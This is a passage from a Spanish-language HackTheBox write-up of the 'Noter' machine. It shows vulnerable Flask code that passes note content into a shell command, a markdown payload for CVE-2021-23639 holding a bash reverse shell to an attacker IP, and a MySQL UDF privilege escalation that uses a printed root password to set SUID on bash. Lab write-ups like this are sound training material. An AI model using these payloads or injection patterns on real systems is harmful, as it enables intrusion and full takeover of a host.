            <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
            <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
         
            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span> <span class="o">+</span><span class="s">'.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
 
<span class="c1"># Export remote
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_remote'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="o">@</span><span class="n">is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
	    <span class="k">try</span><span class="p">:</span>
	        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
 
            <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 
            <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
	                <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                    <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span>
                    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
 
	                <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">):</span>
 
		                <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
                     <span class="k">else</span><span class="p">:</span>
		                 <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured while exporting the !"</span><span class="p">)</span>
 
				 <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
	                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured!"</span><span class="p">)</span>
 
 
             <span class="k">else</span><span class="p">:</span>
                 <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
             
         <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
	         <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
 
	<span class="k">else</span><span class="p">:</span>
	    <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
</pre></table></code></div></div><p>Además, vemos que <code class="language-plaintext highlighter-rouge">md-to-pdf.js</code> se ejecuta con <em>NodeJS</em>. Haciendo una búsqueda por internet nos encontramos una <a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">vulnerabilidad</a> que podríamos probar en la sección de la web <em>Export Notes</em> que se otorga solamente para usuarios ‘VIP’: <img data-src="/assets/favicon/2022-09-03/noter4.png" alt="Export Notes Noter " data-proofer-ignore></p><p>Creamos un archivo malicioso:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s2">"--';bash -i &gt;&amp; /dev/tcp/10.10.14.44/4433 0&gt;&amp;1;'--"</span> <span class="o">&gt;</span> rev.md 
</pre></table></code></div></div><p>Levantamos un servidor con python:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ python3 <span class="nt">-m</span> http.server
</pre></table></code></div></div><p>Y en otra ventana debemos ponernos en “escucha” con <code class="language-plaintext highlighter-rouge">netcat</code> en el puerto que específicamos dentro del archivo malicioso, <code class="language-plaintext highlighter-rouge">4433</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ netcat <span class="nt">-lnvp</span> 4433
</pre></table></code></div></div><p>Y en el campo <em>URL</em> ponemos lo siguiente <code class="language-plaintext highlighter-rouge">http://10.10.14.44:8000/rev.md</code> (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente). Presionamos en <code class="language-plaintext highlighter-rouge">exportar</code> y obtenemos una conexión remota:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ netcat <span class="nt">-lnvp</span> 4433
Listening on 0.0.0.0 4433
Connection received on 10.10.11.160 49170
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1261<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
svc@noter:~/app/web<span class="err">$</span>
</pre></table></code></div></div><h2 id="escalando-privilegios"><span class="mr-2">Escalando privilegios</span><a href="#escalando-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Después de hacer una enumeración básica, no encontramos nada de lo que nos podamos aprovechar. Recordemos que tenemos credenciales para conectarnos a la base de datos. Hay una técnica de <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library">escalada</a> de privilegios mediante <code class="language-plaintext highlighter-rouge">MySQL</code> que podemos probar usando <a href="https://www.exploit-db.com/exploits/1518">este exploit</a>, subiendo el archivo a la máquina víctima y haciendo lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>svc@noter:~/tmp<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c
svc@noter:~/tmp<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
svc@noter:~/tmp<span class="nv">$ </span>mysql <span class="nt">-u</span> <span class="s1">'root'</span> <span class="nt">-p</span><span class="s1">'Nildogg36'</span>

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use mysql<span class="p">;</span>
Database changed

MariaDB <span class="o">[</span>mysql]&gt; create table <span class="nb">test</span><span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
Query OK, 0 rows affected

MariaDB <span class="o">[</span>mysql]&gt; insert into <span class="nb">test </span>values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/tmp/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
Query OK, 1 row affected

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">test </span>into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="p">;</span>
Query OK, 1 row affected

MariaDB <span class="o">[</span>mysql]&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
Query OK, 0 rows affected

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'chmod u+s /bin/bash'</span><span class="o">)</span><span class="p">;</span>
+----------------------------------+
| do_system<span class="o">(</span><span class="s1">'chmod u+s /bin/bash'</span><span class="o">)</span> |
+----------------------------------+
|                                0 |
+----------------------------------+

MariaDB <span class="o">[</span>mysql]&gt; <span class="nb">exit
</span>Bye
</pre></table></code></div></div><p>Ejecutamos el binario <code class="language-plaintext highlighter-rouge">bash</code> con privilegios (<code class="language-plaintext highlighter-rouge">-p</code>) y nos convertimos en <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>svc@noter:~/tmp<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-5.0<span class="se">\#</span> <span class="nb">whoami
</span>root
bash-5.0#
</pre></table></code></div></div><p>¡Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/machines/'>Machines</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/flask-unsing/" class="post-tag no-text-decoration" >flask-unsing</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >JWT</a> <a href="/tags/cve-2021-23639/" class="post-tag no-text-decoration" >CVE-2021-23639</a> <a href="/tags/udf-library/" class="post-tag no-text-decoration" >UDF library</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WriteUp+Noter+HTB+-+rabb1t&url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Noter-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WriteUp+Noter+HTB+-+rabb1t&u=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Noter-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Noter-HTB%2F&text=WriteUp+Noter+HTB+-+rabb1t" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/burpsuite-socks/">Socks y BurpSuite</a><li><a href="/posts/WriteUp-Undetected-HTB/">WriteUp Undetected HTB</a><li><a href="/posts/WriteUp-Late-HTB/">WriteUp Late HTB</a><li><a href="/posts/WriteUp-TimeLapse-HTB/">WriteUp TimeLapse HTB</a><li><a href="/posts/WriteUp-Noter-HTB/">WriteUp Noter HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/WriteUp-Undetected-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1656910800" > 2022-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Undetected HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root Máquina Undetec...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Late-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1659157200" > 2022-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Late HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Anal...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-TimeLapse-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1660971600" > 2022-08-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp TimeLapse HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credencial...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/WriteUp-TimeLapse-HTB/" class="btn btn-outline-primary" prompt="Anterior"><p>WriteUp TimeLapse HTB</p></a> <a href="/posts/WriteUp-RedPanda-HTB/" class="btn btn-outline-primary" prompt="Nuevo"><p>WriteUp RedPanda HTB</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "rabb1t-0/rabb1t-0.github.io", "data-repo-id": "R_kgDOHL8JPA", "data-category": "general", "data-category-id": "DIC_kwDOHL8JPM4CPeS9", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/rabb1t-0">rabb1t</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
